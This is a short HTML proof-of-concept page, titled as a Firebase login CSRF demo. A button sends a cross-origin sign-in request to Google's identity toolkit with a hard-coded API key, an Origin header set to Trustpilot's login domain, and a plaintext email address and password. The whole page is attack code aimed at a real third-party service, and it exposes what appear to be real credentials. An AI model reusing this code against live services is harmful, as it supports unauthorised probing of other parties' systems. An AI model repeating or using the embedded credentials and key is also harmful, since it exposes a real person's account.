<!DOCTYPE html>
<html>
  <body>
    <h1>Firebase Login CSRF PoC</h1>
    <button onclick="csrf()">Send Login Request</button>

    <script>
      function csrf() {
        fetch("https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyDzj0FG4JS6bOUHLhbubOR_CVaH8EGSvO0", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Origin": "https://authenticate.trustpilot.com"  // This header will be ignored by the browser
          },
          body: JSON.stringify({
            returnSecureToken: true,
            email: "gostafoed@gmail.com",
            password: "A1gostafoed@gmail.com",
            clientType: "CLIENT_TYPE_WEB"
          })
        })
        .then(res => res.json())
        .then(data => alert("Response:\n" + JSON.stringify(data, null, 2)))
        .catch(err => alert("Error:\n" + err));
      }
    </script>
  </body>
</html>

